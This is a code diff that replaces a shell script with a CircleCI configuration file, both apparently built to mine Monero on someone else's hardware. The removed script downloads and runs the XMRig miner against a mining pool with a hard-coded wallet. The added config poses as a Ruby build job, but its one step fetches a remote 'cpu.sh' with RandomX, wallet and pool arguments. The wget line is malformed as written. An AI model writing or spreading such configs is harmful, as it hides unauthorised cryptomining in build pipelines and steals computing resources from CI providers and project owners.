@@ -1,11 +1,11 @@
-#!bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz
-tar xf xmrig-6.16.3-linux-x64.tar.gz
-cd xmrig-6.16.3
-./xmrig -o auto.c3pool.org:17777 -a rx -k -u 875cSnqJjxFUjwhD5eSKH5WdeA6e8on3GYQ5BnqCJdtyGw7p4Juv4wddjr7YcsjDFecoznkw718MUQsu23bcTCNd2YXpGjZ
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/ManowProf/Learning/circleci-project-setup/cpu.sh -algo randomx -coin XMR -wallet 89pALi7aioBPJx14qUsbop8rwhr51B3qdBLLYFs6ZHDSeTfdWgCsUYUC5gU8isA6EBfTXtTRNaqnkfj66wj9jidS91XgPUM -pool1 xmr-eu1.nanopool.org:14433
